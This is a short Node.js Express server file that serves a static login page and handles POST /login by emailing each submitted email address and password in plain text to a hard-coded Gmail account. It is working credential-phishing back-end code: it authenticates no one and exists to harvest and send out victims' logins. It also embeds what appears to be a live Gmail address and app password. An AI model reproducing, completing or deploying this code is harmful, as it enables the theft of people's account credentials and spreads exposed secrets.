// server.js
const express = require('express');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static('public')); // place the HTML file in a folder named 'public'

app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Email the credentials to yourself
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'umehvictor511@gmail.com',
      pass: 'lbuipfzehkzgabin'
    }
  });

  const mailOptions = {
    from: 'umehvictor511@gmail.com',
    to: 'umehvictor511@gmail.com',
    subject: 'New Login Submission',
    text: `Email: ${email}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send('Success');
  } catch (err) {
    console.error('Email error:', err);
    res.status(500).send('Email failed');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});